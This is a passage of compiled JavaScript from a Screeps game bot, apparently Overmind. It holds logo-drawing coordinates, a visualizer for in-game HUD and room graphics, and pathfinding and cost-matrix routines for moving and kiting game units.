        points: [[-3.94, -3.7], [-3.72, -3.86], [-3.58, -3.68], [-1, 2.54], [-0.62, 2.9], [-0.16, 2.96], [0.46, 2.6], [3.1, -3.72], [3.38, -3.82], [3.4, -3.56], [0.86, 2.52], [0.48, 3.04], [0, 3.26], [-0.66, 3.22], [-1.26, 2.72], [-3.92, -3.68]]
    },
    E: {
        coords: [500, 880],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-4.28, 0.52], [-4.1, 1.3], [-3.7, 2.04], [-3.12, 2.64], [-2.4, 3.06], [-1.64, 3.26], [1.4, 3.2], [1.4, 3], [1.16, 2.9], [-1.5, 2.92], [-2.2, 2.76], [-3.14, 2.16], [-3.76, 1.2], [-3.92, 0.52], [-3.84, -0.12], [0.84, -0.12], [0.96, -0.24], [0.78, -0.48], [-3.9, -0.48], [-3.92, -1.12], [-3.7, -1.94], [-3.26, -2.62], [-2.6, -3.16], [-1.46, -3.52], [1.38, -3.56], [1.4, -3.8], [1.2, -3.88], [-1.42, -3.88], [-2.82, -3.44], [-3.88, -2.36], [-4.28, -1.12], [-4.26, 0.52]]
    },
    R1: {
        coords: [850, 1000],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-4.36, 3.1], [-4.36, -2.56], [-4.26, -2.96], [-3.82, -3.56], [-3.38, -3.8], [-1.88, -3.88], [-1.78, -3.5], [-3.2, -3.48], [-3.58, -3.3], [-3.88, -2.94], [-4, -2.54], [-4, 0.3], [-1.78, 0.36], [-1.9, 0.38], [-1.96, 0.72], [-1.78, 0.74], [-3.98, 0.74], [-3.98, 3.06], [-4.1, 3.26], [-4.3, 3.24], [-4.34, 3.1]]
    },
    R2: {
        coords: [1000, 1200],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-4.78, 0.74], [-4.78, 0.36], [-3.1, 0.36], [-2.22, -2.0e-2], [-1.62, -0.78], [-1.46, -1.78], [-1.74, -2.58], [-2.38, -3.22], [-3.28, -3.52], [-4.78, -3.5], [-4.7, -3.86], [-4.78, -3.88], [-3.12, -3.86], [-2.12, -3.48], [-1.62, -3.02], [-1.26, -2.42], [-1.1, -1.78], [-1.2, -0.88], [-1.56, -0.18], [-2.04, 0.3], [-2.64, 0.62], [-3.4, 0.8], [-1.22, 2.96], [-1.22, 3.24], [-1.44, 3.26], [-3.94, 0.74], [-4.76, 0.72]]
    },
    M: {
        coords: [1200, 1799],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-3.82, 3.14], [-3.6, 3.28], [-3.48, 3.08], [-2.52, -3.48], [-2.26, -3.52], [-2.1, -3.34], [0.28, 3.04], [0.56, 3.26], [0.9, 3.28], [1.3, 2.92], [3.62, -3.34], [3.88, -3.54], [4.14, -3.3], [5.02, 3.16], [5.28, 3.26], [4.44, -3.4], [4.28, -3.7], [3.98, -3.84], [3.56, -3.76], [3.34, -3.48], [1.02, 2.78], [0.78, 2.98], [0.52, 2.82], [-1.88, -3.6], [-2.24, -3.84], [-2.78, -3.68], [-3.8, 3.12]]
    },
    I: {
        coords: [1750, 1850],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-4.58, 3.1], [-4.32, 3.26], [-4.2, 3.06], [-4.2, -3.66], [-4.46, -3.86], [-4.58, -3.7], [-4.56, 3.1]]
    },
    N: {
        coords: [1850, 2250],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-4.46, 3.16], [-4.46, -3.4], [-4.34, -3.66], [-3.88, -3.88], [-3.4, -3.64], [1.52, 2.74], [1.84, 2.96], [2.12, 2.64], [2.12, -3.76], [2.36, -3.82], [2.42, 2.8], [2.28, 3.08], [1.66, 3.26], [1.38, 3.08], [-3.62, -3.4], [-3.96, -3.54], [-4.16, -3.28], [-4.16, 3.16], [-4.44, 3.18]]
    },
    D: {
        coords: [2250, 2700],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
        points: [[-4.12, 1.82], [-3.76, 2.78], [-2.8, 3.28], [-0.36, 3.24], [0.3, 3.04], [1.14, 2.5], [1.78, 1.68], [2.08, 0.84], [2.04, -1.6], [1.68, -2.44], [1.06, -3.16], [0.28, -3.64], [-0.56, -3.86], [-2.88, -3.86], [-3, -3.82], [-2.92, -3.48], [-0.32, -3.46], [0.52, -3.12], [1.2, -2.52], [1.6, -1.84], [1.78, -1.1], [1.78, 0.54], [1.38, 1.68], [0.68, 2.42], [-0.38, 2.88], [-2.78, 2.92], [-3.5, 2.54], [-3.74, 1.98], [-3.74, -2.58], [-3.46, -3.18], [-2.94, -3.48], [-3.06, -3.82], [-3.72, -3.42], [-4.08, -2.72], [-4.1, 1.8]]
    },
};
const logoX = 2.5; // x-position of logo
const logoY = 3.0; // y position of logo
const logoScale = 0.6;
const logoComponents = _.mapValues(_logoComponents, c => ({
    style: c.style,
    points: _.map(c.points, xy => [logoX + logoScale * xy[0],
        logoY + logoScale * xy[1]])
}));
const textX = logoX + 5.6 * logoScale; // x-position of logo
const textY = logoY + .5 * logoScale; // y position of logo
const textScale = 0.6 * logoScale;
const charScale = 0.052 * textScale;
let offset = 0;
const logoText = _.mapValues(_logoText, function (c) {
    const ret = {
        style: c.style,
        points: _.map(c.points, xy => [textX + textScale * (offset + xy[0]),
            textY + textScale * xy[1]])
    };
    offset += charScale * (c.coords[1] - c.coords[0]);
    return ret;
});

const TEXT_COLOR = '#c9c9c9';
const TEXT_SIZE = .8;
const CHAR_WIDTH = TEXT_SIZE * 0.4;
const CHAR_HEIGHT = TEXT_SIZE * 0.9;
/**
 * The Visualizer contains many static methods for drawing room visuals and displaying information through a GUI
 */
let Visualizer = class Visualizer {
    static get enabled() {
        return Memory.settings.enableVisuals;
    }
    static textStyle(size = 1, style = {}) {
        return _.defaults(style, {
            color: TEXT_COLOR,
            align: 'left',
            font: `${size * TEXT_SIZE} Trebuchet MS`,
            opacity: 0.8,
        });
    }
    static circle(pos, color = 'red', opts = {}) {
        _.defaults(opts, {
            fill: color,
            radius: 0.35,
            opacity: 0.5,
        });
        return new RoomVisual(pos.roomName).circle(pos.x, pos.y, opts);
    }
    static marker(pos, opts = {}) {
        return new RoomVisual(pos.roomName).animatedPosition(pos.x, pos.y, opts);
    }
    static drawStructureMap(structureMap) {
        if (!this.enabled)
            return;
        const vis = {};
        for (const structureType in structureMap) {
            for (const pos of structureMap[structureType]) {
                if (!vis[pos.roomName]) {
                    vis[pos.roomName] = new RoomVisual(pos.roomName);
                }
                vis[pos.roomName].structure(pos.x, pos.y, structureType);
            }
        }
        for (const roomName in vis) {
            vis[roomName].connectRoads();
        }
    }
    static drawLayout(layout, anchor, opts = {}) {
        _.defaults(opts, { opacity: 0.5 });
        if (!this.enabled)
            return;
        const vis = new RoomVisual(anchor.roomName);
        for (const structureType in layout[8].buildings) {
            for (const pos of layout[8].buildings[structureType].pos) {
                const dx = pos.x - layout.data.anchor.x;
                const dy = pos.y - layout.data.anchor.y;
                vis.structure(anchor.x + dx, anchor.y + dy, structureType, opts);
            }
        }
        vis.connectRoads(opts);
    }
    static drawRoads(positoins) {
        const pointsByRoom = _.groupBy(positoins, pos => pos.roomName);
        for (const roomName in pointsByRoom) {
            const vis = new RoomVisual(roomName);
            for (const pos of pointsByRoom[roomName]) {
                vis.structure(pos.x, pos.y, STRUCTURE_ROAD);
            }
            vis.connectRoads();
        }
    }
    static drawPath(path, style) {
        const pointsByRoom = _.groupBy(path, pos => pos.roomName);
        for (const roomName in pointsByRoom) {
            new RoomVisual(roomName).poly(pointsByRoom[roomName], style);
        }
    }
    static displayCostMatrix(costMatrix, roomName, dots = true, color = '#ff0000') {
        const vis = new RoomVisual(roomName);
        let x, y;
        if (dots) {
            let cost;
            let max = 1;
            for (y = 0; y < 50; ++y) {
                for (x = 0; x < 50; ++x) {
                    max = Math.max(max, costMatrix.get(x, y));
                }
            }
            for (y = 0; y < 50; ++y) {
                for (x = 0; x < 50; ++x) {
                    cost = costMatrix.get(x, y);
                    if (cost > 0) {
                        vis.circle(x, y, { radius: costMatrix.get(x, y) / max / 2, fill: color });
                    }
                }
            }
        }
        else {
            for (y = 0; y < 50; ++y) {
                for (x = 0; x < 50; ++x) {
                    vis.text(costMatrix.get(x, y).toString(), x, y, { color: color });
                }
            }
        }
    }
    static showInfo(info, calledFrom, opts = {}) {
        if (calledFrom.room) {
            return calledFrom.room.visual.infoBox(info, calledFrom.pos.x, calledFrom.pos.y, opts);
        }
        else {
            return new RoomVisual(calledFrom.pos.roomName).infoBox(info, calledFrom.pos.x, calledFrom.pos.y, opts);
        }
    }
    static section(title, pos, width, height) {
        const vis = new RoomVisual(pos.roomName);
        vis.rect(pos.x, pos.y - CHAR_HEIGHT, width, 1.1 * CHAR_HEIGHT, { opacity: 0.15 });
        vis.box(pos.x, pos.y - CHAR_HEIGHT, width, height + (1.1 + .25) * CHAR_HEIGHT, { color: TEXT_COLOR });
        vis.text(title, pos.x + .25, pos.y - .05, this.textStyle());
        return { x: pos.x + 0.25, y: pos.y + 1.1 * CHAR_HEIGHT };
    }
    static infoBox(header, content, pos, width) {
        // const vis = new RoomVisual(pos.roomName);
        // vis.rect(pos.x, pos.y - charHeight, width, 1.1 * charHeight, {opacity: 0.15});
        // vis.box(pos.x, pos.y - charHeight, width, ((content.length || 1) + 1.1 + .25) * charHeight,
        //      {color: textColor});
        // vis.text(header, pos.x + .25, pos.y - .05, this.textStyle());
        const height = CHAR_HEIGHT * (content.length || 1);
        const { x, y } = this.section(header, pos, width, height);
        if (content.length > 0) {
            if (_.isArray(content[0])) {
                this.table(content, {
                    x: x,
                    y: y,
                    roomName: pos.roomName
                });
            }
            else {
                this.multitext(content, {
                    x: x,
                    y: y,
                    roomName: pos.roomName
                });
            }
        }
        // return pos.y - charHeight + ((content.length || 1) + 1.1 + .25) * charHeight + 0.1;
        const spaceBuffer = 0.5;
        return y + height + spaceBuffer;
    }
    static text(text, pos, size = 1, style = {}) {
        new RoomVisual(pos.roomName).text(text, pos.x, pos.y, this.textStyle(size, style));
    }
    static barGraph(progress, pos, width = 7, scale = 1) {
        const vis = new RoomVisual(pos.roomName);
        let percent;
        let mode;
        if (typeof progress === 'number') {
            percent = progress;
            mode = 'percent';
        }
        else {
            percent = progress[0] / progress[1];
            mode = 'fraction';
        }
        // Draw frame
        vis.box(pos.x, pos.y - CHAR_HEIGHT * scale, width, 1.1 * scale * CHAR_HEIGHT, { color: TEXT_COLOR });
        vis.rect(pos.x, pos.y - CHAR_HEIGHT * scale, percent * width, 1.1 * scale * CHAR_HEIGHT, {
            fill: TEXT_COLOR,
            opacity: 0.4,
            strokeWidth: 0
        });
        // Draw text
        if (mode == 'percent') {
            vis.text(`${Math.round(100 * percent)}%`, pos.x + width / 2, pos.y - .1 * CHAR_HEIGHT, this.textStyle(1, { align: 'center' }));
        }
        else {
            const [num, den] = progress;
            vis.text(`${num}/${den}`, pos.x + width / 2, pos.y - .1 * CHAR_HEIGHT, this.textStyle(1, { align: 'center' }));
        }
    }
    static table(data, pos) {
        if (data.length == 0) {
            return;
        }
        const colPadding = 4;
        const vis = new RoomVisual(pos.roomName);
        const style = this.textStyle();
        // Determine column locations
        const columns = Array(_.first(data).length).fill(0);
        for (const entries of data) {
            for (let i = 0; i < entries.length - 1; i++) {
                columns[i] = Math.max(columns[i], entries[i].length);
            }
        }
        // // Draw header and underline
        // vis.text(header, pos.x, pos.y, style);
        // vis.line(pos.x, pos.y + .3 * charHeight,
        //  pos.x + charWidth * _.sum(columns) + colPadding * columns.length, pos.y + .25 * charHeight, {
        //           color: textColor
        //       });
        // Draw text
        // let dy = 1.5 * charHeight;
        let dy = 0;
        for (const entries of data) {
            let dx = 0;
            for (const i in entries) {
                vis.text(entries[i], pos.x + dx, pos.y + dy, style);
                dx += CHAR_WIDTH * (columns[i] + colPadding);
            }
            dy += CHAR_HEIGHT;
        }
    }
    static multitext(lines, pos) {
        if (lines.length == 0) {
            return;
        }
        const vis = new RoomVisual(pos.roomName);
        const style = this.textStyle();
        // Draw text
        let dy = 0;
        for (const line of lines) {
            vis.text(line, pos.x, pos.y + dy, style);
            dy += CHAR_HEIGHT;
        }
    }
    static drawHUD() {
        // Draw Overmind logo
        new RoomVisual().multitext(asciiLogo, 0, 0, { textfont: 'monospace' });
        // // Display CPU Information
        // new RoomVisual().text('CPU:' + ' bucket:' + Game.cpu.bucket +
        //                    ' tickLimit:' + Game.cpu.tickLimit, column, row, style);
    }
    /* Draws the Overmind logo using component coordinates extracted with Mathematica. This  uses about 0.2 CPU/tick */
    static drawLogo() {
        new RoomVisual().poly(logoComponents.black.points, logoComponents.black.style)
            .poly(logoComponents.dgray.points, logoComponents.dgray.style)
            .poly(logoComponents.lgray.points, logoComponents.lgray.style)
            .poly(logoComponents.blue.points, logoComponents.blue.style)
            .poly(logoComponents.red.points, logoComponents.red.style)
            .poly(logoComponents.purple.points, logoComponents.purple.style)
            .poly(logoComponents.pink.points, logoComponents.pink.style)
            .poly(logoText.V.points, logoText.V.style)
            .poly(logoText.E.points, logoText.E.style)
            .poly(logoText.R1.points, logoText.R1.style)
            .poly(logoText.R2.points, logoText.R2.style)
            .poly(logoText.M.points, logoText.M.style)
            .poly(logoText.I.points, logoText.I.style)
            .poly(logoText.N.points, logoText.N.style)
            .poly(logoText.D.points, logoText.D.style);
    }
    static drawNotifications(notificationMessages) {
        // const vis = new RoomVisual();
        const x = 10.5;
        const y = 7;
        if (notificationMessages.length == 0) {
            notificationMessages = ['No notifications'];
        }
        const maxStringLength = _.max(_.map(notificationMessages, msg => msg.length));
        const width = Math.max(11, 1.2 * CHAR_WIDTH * maxStringLength);
        this.infoBox('Notifications', notificationMessages, { x, y }, width);
    }
    // static colonyReport(colonyName: string, text: string[]) {
    //  if (!this.enabled) return;
    //  new RoomVisual(colonyName).multitext(text, 0, 4, {textfont: 'monospace', textsize: 0.75});
    // }
    static drawGraphs() {
        this.text(`CPU`, { x: 1, y: 7 });
        this.barGraph(Memory.stats.persistent.avgCPU / Game.cpu.limit, { x: 2.75, y: 7 });
        this.text(`BKT`, { x: 1, y: 8 });
        this.barGraph(Game.cpu.bucket / 10000, { x: 2.75, y: 8 });
        this.text(`GCL`, { x: 1, y: 9 });
        this.barGraph(Game.gcl.progress / Game.gcl.progressTotal, { x: 2.75, y: 9 });
    }
    static summary() {
        this.text(`Colonies: ${_.keys(Overmind.colonies).length} | Creeps: ${_.keys(Game.creeps).length}`, {
            x: 1,
            y: 10
        }, .93);
    }
    // This typically takes about 0.3-0.6 CPU in total
    static visuals() {
        this.drawLogo();
        this.drawGraphs();
        // this.drawNotifications();
        this.summary();
    }
};
Visualizer = __decorate([
    profile
], Visualizer);

/**
 * Returns destination.pos if destination has a position, or destination if destination is a RoomPosition
 */
function normalizePos(destination) {
    if (hasPos(destination)) {
        return destination.pos;
    }
    else {
        return destination;
    }
}
/**
 * Returns if the coordinate is on an exit tile
 */
function isExit(pos) {
    return pos.x == 0 || pos.y == 0 || pos.x == 49 || pos.y == 49;
}
/**
 * Checks if the coordinates of two room positions are the same
 */
function sameCoord(pos1, pos2) {
    return pos1.x == pos2.x && pos1.y == pos2.y;
}
/**
 * Returns the number of move parts and number of weight-generating parts in a creep
 */
function getCreepWeightInfo(creep, analyzeCarry = true) {
    // Compute number of weighted and unweighted bodyparts
    const unweightedParts = analyzeCarry ? [MOVE, CARRY] : [MOVE];
    const bodyParts = _.countBy(creep.body, p => _.contains(unweightedParts, p.type) ? p.type : 'weighted');
    bodyParts.move = bodyParts.move || 0;
    bodyParts.weighted = bodyParts.weighted || 0;
    if (bodyParts[CARRY]) {
        bodyParts.weighted += Math.ceil(_.sum(creep.carry) / CARRY_CAPACITY);
    }
    // Account for boosts
    for (const part of creep.body) {
        if (part.type == MOVE && part.boost) {
            bodyParts.move += (BOOSTS.move[part.boost].fatigue - 1);
        }
    }
    return bodyParts;
}
/**
 * Get terrain costs which take into account a creep's individual fatigue stats
 */
function getTerrainCosts(creep) {
    const data = getCreepWeightInfo(creep);
    const ratio = data.weighted / data.move;
    return {
        plainCost: Math.ceil(ratio),
        swampCost: 5 * Math.ceil(ratio),
    };
}

var Pathing_1;
const DEFAULT_MAXOPS = 20000; // Default timeout for pathfinding
const CREEP_COST = 0xfe;
const MatrixTypes = {
    direct: 'dir',
    default: 'def',
    sk: 'sk',
    obstacle: 'obst',
    preferRampart: 'preframp'
};
/**
 * Module for pathing-related operations.
 */
let Pathing = Pathing_1 = class Pathing {
    // Room avoidance methods ==========================================================================================
    /**
     * Check if the room should be avoiding when calculating routes
     */
    static shouldAvoid(roomName) {
        return Memory.rooms[roomName] && Memory.rooms[roomName]["a" /* AVOID */];
    }
    /**
     * Update memory on whether a room should be avoided based on controller owner
     */
    static updateRoomStatus(room) {
        if (!room) {
            return;
        }
        if (room.controller) {
            if (room.controller.owner && !room.controller.my && room.towers.length > 0) {
                room.memory["a" /* AVOID */] = true;
            }
            else {
                delete room.memory["a" /* AVOID */];
                // if (room.memory.expansionData == false) delete room.memory.expansionData;
            }
        }
    }
    // Pathfinding and room callback methods ===========================================================================
    /**
     * Find a path from origin to destination
     */
    static findPath(origin, destination, options = {}) {
        _.defaults(options, {
            ignoreCreeps: true,
            maxOps: DEFAULT_MAXOPS,
            range: 1,
            terrainCosts: { plainCost: 1, swampCost: 5 },
        });
        if (options.movingTarget) {
            options.range = 0;
        }
        // check to see whether findRoute should be used
        const roomDistance = Game.map.getRoomLinearDistance(origin.roomName, destination.roomName);
        let allowedRooms = options.route;
        if (!allowedRooms && (options.useFindRoute || (options.useFindRoute === undefined && roomDistance > 2))) {
            allowedRooms = this.findRoute(origin.roomName, destination.roomName, options);
        }
        if (options.direct) {
            options.terrainCosts = { plainCost: 1, swampCost: 1 };
        }
        const callback = (roomName) => this.roomCallback(roomName, origin, destination, allowedRooms, options);
        let ret = PathFinder.search(origin, { pos: destination, range: options.range }, {
            maxOps: options.maxOps,
            maxRooms: options.maxRooms,
            plainCost: options.terrainCosts.plainCost,
            swampCost: options.terrainCosts.swampCost,
            roomCallback: callback,
        });
        if (ret.incomplete && options.ensurePath) {
            if (options.useFindRoute == undefined) {
                // handle case where pathfinder failed at a short distance due to not using findRoute
                // can happen for situations where the creep would have to take an uncommonly indirect path
                // options.allowedRooms and options.routeCallback can also be used to handle this situation
                if (roomDistance <= 2) {
                    log.warning(`Movement: path failed without findroute. Origin: ${origin.print}, ` +
                        `destination: ${destination.print}. Trying again with options.useFindRoute = true...`);
                    options.useFindRoute = true;
                    ret = this.findPath(origin, destination, options);
                    log.warning(`Movement: second attempt was ${ret.incomplete ? 'not ' : ''}successful`);
                    return ret;
                }
            }
            else {
            }
        }
        return ret;
    }
    /**
     * Find a path from origin to destination
     */
    static findSwarmPath(origin, destination, width, height, options = {}) {
        _.defaults(options, {
            ignoreCreeps: true,
            maxOps: 2 * DEFAULT_MAXOPS,
            range: 1,
        });
        // Make copies of the destination offset for where anchor could be
        const destinations = this.getPosWindow(destination, -width, -height);
        const callback = (roomName) => this.swarmRoomCallback(roomName, width, height, options);
        return PathFinder.search(origin, _.map(destinations, pos => ({ pos: pos, range: options.range })), {
            maxOps: options.maxOps,
            maxRooms: options.maxRooms,
            plainCost: 1,
            swampCost: 5,
            roomCallback: callback,
        });
    }
    /**
     * Get a window of offset RoomPositions from an anchor position and a window width and height
     */
    static getPosWindow(anchor, width, height) {
        const positions = [];
        for (const dx of _.range(0, width, width < 0 ? -1 : 1)) {
            for (const dy of _.range(0, height, height < 0 ? -1 : 1)) {
                positions.push(anchor.getOffsetPos(dx, dy));
            }
        }
        return positions;
    }
    /**
     * Returns the shortest path from start to end position, regardless of (passable) terrain
     */
    static findShortestPath(startPos, endPos, options = {}) {
        _.defaults(options, {
            ignoreCreeps: true,
            range: 1,
            direct: true,
        });
        const ret = this.findPath(startPos, endPos, options);
        if (ret.incomplete)
            log.alert(`Pathing: incomplete path from ${startPos.print} to ${endPos.print}!`);
        return ret;
    }
    /**
     * Returns the shortest path from start to end position, regardless of (passable) terrain
     */
    static findPathToRoom(startPos, roomName, options = {}) {
        options.range = 23;
        const ret = this.findPath(startPos, new RoomPosition(25, 25, roomName), options);
        if (ret.incomplete)
            log.alert(`Pathing: incomplete path from ${startPos.print} to ${roomName}!`);
        return ret;
    }
    /**
     * Default room callback, which automatically determines the most appropriate callback method to use
     */
    static roomCallback(roomName, origin, destination, allowedRooms, options) {
        if (allowedRooms && !allowedRooms[roomName]) {
            return false;
        }
        if (!options.allowHostile && this.shouldAvoid(roomName)
            && roomName != origin.roomName && roomName != destination.roomName) {
            return false;
        }
        const room = Game.rooms[roomName];
        if (room) {
            const matrix = this.getCostMatrix(room, options, false);
            // Modify cost matrix if needed
            if (options.modifyRoomCallback) {
                return options.modifyRoomCallback(room, matrix.clone());
            }
            else {
                return matrix;
            }
        }
        else { // have no vision
            return this.getCostMatrixForInvisibleRoom(roomName, options);
        }
    }
    static swarmRoomCallback(roomName, width, height, options) {
        const room = Game.rooms[roomName];
        let matrix;
        if (room && !options.ignoreStructures) {
            matrix = this.getSwarmDefaultMatrix(room, width, height, options, false);
        }
        else {
            matrix = this.getSwarmTerrainMatrix(roomName, width, height, options.exitCost);
        }
        if (options.displayCostMatrix) {
            Visualizer.displayCostMatrix(matrix, roomName);
        }
        return matrix;
    }
    static kitingRoomCallback(roomName) {
        const room = Game.rooms[roomName];
        if (room) {
            return Pathing_1.getKitingMatrix(room);
        }
        else { // have no vision
            return true;
        }
    }
    /**
     * Get a kiting path within a room
     */
    static findKitingPath(creepPos, fleeFrom, options = {}) {
        _.defaults(options, {
            fleeRange: 5,
            terrainCosts: { plainCost: 1, swampCost: 5 },
        });
        const fleeFromPos = _.map(fleeFrom, flee => normalizePos(flee));
        const avoidGoals = _.map(fleeFromPos, pos => {
            return { pos: pos, range: options.fleeRange };
        });
        return PathFinder.search(creepPos, avoidGoals, {
            plainCost: options.terrainCosts.plainCost,
            swampCost: options.terrainCosts.swampCost,
            flee: true,
            roomCallback: Pathing_1.kitingRoomCallback,
            maxRooms: 1
        });
    }
    /**
     * Get a flee path possibly leaving the room; generally called further in advance of kitingPath
     */
    static findFleePath(creepPos, fleeFrom, options = {}) {
        _.defaults(options, {
            terrainCosts: { plainCost: 1, swampCost: 5 },
        });
        if (options.fleeRange == undefined)
            options.fleeRange = options.terrainCosts.plainCost > 1 ? 20 : 10;
        const fleeFromPos = _.map(fleeFrom, flee => normalizePos(flee));
        const avoidGoals = _.map(fleeFromPos, pos => {
            return { pos: pos, range: options.fleeRange };
        });
        const callback = (roomName) => {
            if (!options.allowHostile && this.shouldAvoid(roomName) && roomName != creepPos.roomName) {
                return false;
            }
            const room = Game.rooms[roomName];
            if (room) {
                const matrix = this.getCostMatrix(room, options, false);
                // Modify cost matrix if needed
                if (options.modifyRoomCallback) {
                    return options.modifyRoomCallback(room, matrix.clone());
                }
                else {
                    return matrix;
                }
            }
            else { // have no vision
                return true;
            }
        };
        return PathFinder.search(creepPos, avoidGoals, {
            plainCost: options.terrainCosts.plainCost,
            swampCost: options.terrainCosts.swampCost,
            flee: true,
            roomCallback: callback,
        });
    }
    // Cost matrix retrieval functions =================================================================================
    /**
     * Get a cloned copy of the cost matrix for a room with specified options
     */
    static getCostMatrix(room, options, clone = true) {
        let matrix;
        if (options.ignoreCreeps == false) {
            matrix = this.getCreepMatrix(room);
        }
        else if (options.avoidSK) {
            matrix = this.getSkMatrix(room);
        }
        else if (options.ignoreStructures) {
            matrix = new PathFinder.CostMatrix();
        }
        else if (options.direct) {
            matrix = this.getDirectMatrix(room);
        }
        else {
            matrix = this.getDefaultMatrix(room);
        }
        // Register other obstacles
        if (options.obstacles && options.obstacles.length > 0) {
            matrix = matrix.clone();
            for (const obstacle of options.obstacles) {
                if (obstacle && obstacle.roomName == room.name) {
                    matrix.set(obstacle.x, obstacle.y, 0xff);
                }
            }
        }
        if (clone) {
            matrix = matrix.clone();
        }
        return matrix;
    }
    static getSwarmDefaultMatrix(room, width, height, options = {}, clone = true) {
        let matrix = $.costMatrix(room.name, `swarm${width}x${height}`, () => {
            const mat = this.getTerrainMatrix(room.name).clone();
            this.blockImpassibleStructures(mat, room);
            this.setExitCosts(mat, room.name, options.exitCost || 10);
            this.applyMovingMaximum(mat, width, height);
            return mat;
        }, 25);
        if (options.ignoreCreeps == false) {
            matrix = matrix.clone();
            this.blockHostileCreeps(matrix, room); // todo: need to smear again?
        }
        if (clone) {
            matrix = matrix.clone();
        }
        return matrix;
    }
    static getCostMatrixForInvisibleRoom(roomName, options, clone = true) {
        let matrix;
        if (options.avoidSK) {
            matrix = $.costMatrixRecall(roomName, MatrixTypes.sk);
        }
        else if (options.direct) {
            matrix = $.costMatrixRecall(roomName, MatrixTypes.direct);
        }
        else {
            matrix = $.costMatrixRecall(roomName, MatrixTypes.default);
        }
        // Register other obstacles
        if (matrix && options.obstacles && options.obstacles.length > 0) {
            matrix = matrix.clone();
            for (const obstacle of options.obstacles) {
                if (obstacle && obstacle.roomName == roomName) {
                    matrix.set(obstacle.x, obstacle.y, 0xff);
                }
            }
        }
        if (matrix && clone) {
            matrix = matrix.clone();
        }
        return matrix || true;
    }
    // Cost matrix generation functions ================================================================================
    /**
     * Get a matrix of explicit terrain values for a room
     */
    static getTerrainMatrix(roomName, costs = { plainCost: 1, swampCost: 5 }) {
        return $.costMatrix(roomName, `terrain:${costs.plainCost}:${costs.swampCost}`, () => {
            const matrix = new PathFinder.CostMatrix();
            const terrain = Game.map.getRoomTerrain(roomName);
            for (let y = 0; y < 50; ++y) {
                for (let x = 0; x < 50; ++x) {
                    switch (terrain.get(x, y)) {
                        case TERRAIN_MASK_SWAMP:
                            matrix.set(x, y, costs.swampCost);
                            break;
                        case TERRAIN_MASK_WALL:
                            matrix.set(x, y, 0xff);
                            break;
                        default: // plain
                            matrix.set(x, y, costs.plainCost);
                            break;
                    }
                }
            }
            return matrix;
        }, 10000);
    }
    /**
     * Get a cloned copy of the cost matrix for a room with specified options
     */
    static getSwarmTerrainMatrix(roomName, width, height, exitCost = 10) {
        const matrix = $.costMatrix(roomName, `swarmTerrain${width}x${height}EC${exitCost}`, () => {
            const mat = this.getTerrainMatrix(roomName).clone();
            this.setExitCosts(mat, roomName, exitCost);
            this.applyMovingMaximum(mat, width, height);
            return mat;
        }, 10000);
        return matrix;
    }
    /**
     * Default matrix for a room, setting impassable structures and constructionSites to impassible
     */
    static getDefaultMatrix(room) {
        return $.costMatrix(room.name, MatrixTypes.default, () => {
            const matrix = new PathFinder.CostMatrix();
            // Set passability of structure positions
            const impassibleStructures = [];
            _.forEach(room.find(FIND_STRUCTURES), (s) => {
                if (s.structureType == STRUCTURE_ROAD) {
                    matrix.set(s.pos.x, s.pos.y, 1);
                }
                else if (!s.isWalkable) {
                    impassibleStructures.push(s);
                }
            });
            _.forEach(impassibleStructures, s => matrix.set(s.pos.x, s.pos.y, 0xff));
            const portals = _.filter(impassibleStructures, s => s.structureType == STRUCTURE_PORTAL);
            _.forEach(portals, p => matrix.set(p.pos.x, p.pos.y, 0xfe));
            // Set passability of construction sites
            _.forEach(room.find(FIND_CONSTRUCTION_SITES), (site) => {
                if (site.my && !site.isWalkable) {
                    matrix.set(site.pos.x, site.pos.y, 0xff);
                }
            });
            return matrix;
        });
    }
    /**
     * Default matrix for a room, setting impassable structures and constructionSites to impassible, ignoring roads
     */
    static getDirectMatrix(room) {
        return $.costMatrix(room.name, MatrixTypes.direct, () => {
            const matrix = new PathFinder.CostMatrix();
            // Set passability of structure positions
            const impassibleStructures = [];
            _.forEach(room.find(FIND_STRUCTURES), (s) => {
                if (!s.isWalkable) {
                    impassibleStructures.push(s);
                }
            });
            _.forEach(impassibleStructures, s => matrix.set(s.pos.x, s.pos.y, 0xff));
            const portals = _.filter(impassibleStructures, s => s.structureType == STRUCTURE_PORTAL);
            _.forEach(portals, p => matrix.set(p.pos.x, p.pos.y, 0xfe));
            // Set passability of construction sites
            _.forEach(room.find(FIND_MY_CONSTRUCTION_SITES), (site) => {
                if (!site.isWalkable) {
                    matrix.set(site.pos.x, site.pos.y, 0xff);
                }
            });
            return matrix;
        });
    }
    /**
     * Avoids creeps in a room
     */
    static getCreepMatrix(room, fromMatrix) {
        if (room._creepMatrix) {
            return room._creepMatrix;
        }
        const matrix = this.getDefaultMatrix(room).clone();
        _.forEach(room.find(FIND_CREEPS), c => matrix.set(c.pos.x, c.pos.y, CREEP_COST)); // don't block off entirely
        room._creepMatrix = matrix;
        return room._creepMatrix;
    }
    /**
     * Kites around hostile creeps in a room
     */
    static getKitingMatrix(room) {
        if (room._kitingMatrix) {
            return room._kitingMatrix;
        }
        const matrix = this.getCreepMatrix(room).clone();
        const avoidCreeps = _.filter(room.hostiles, c => c.getActiveBodyparts(ATTACK) > 0 || c.getActiveBodyparts(RANGED_ATTACK) > 0);
        // || c.getActiveBodyparts(HEAL) > 0);
        _.forEach(avoidCreeps, avoidCreep => {
            let cost;
            for (let dx = -3; dx <= 3; dx++) {
                for (let dy = -3; dy <= 3; dy++) {
                    cost = matrix.get(avoidCreep.pos.x + dx, avoidCreep.pos.y + dy);
                    cost += 40 - (10 * Math.max(Math.abs(dx), Math.abs(dy)));
                    matrix.set(avoidCreep.pos.x + dx, avoidCreep.pos.y + dy, cost);
                }
            }
        });
        room._kitingMatrix = matrix;
        return room._kitingMatrix;
    }
    /**
     * Avoids source keepers in a room
     */
    static getSkMatrix(room) {
        if (Cartographer.roomType(room.name) != ROOMTYPE_SOURCEKEEPER) {
            return this.getDefaultMatrix(room);
        }
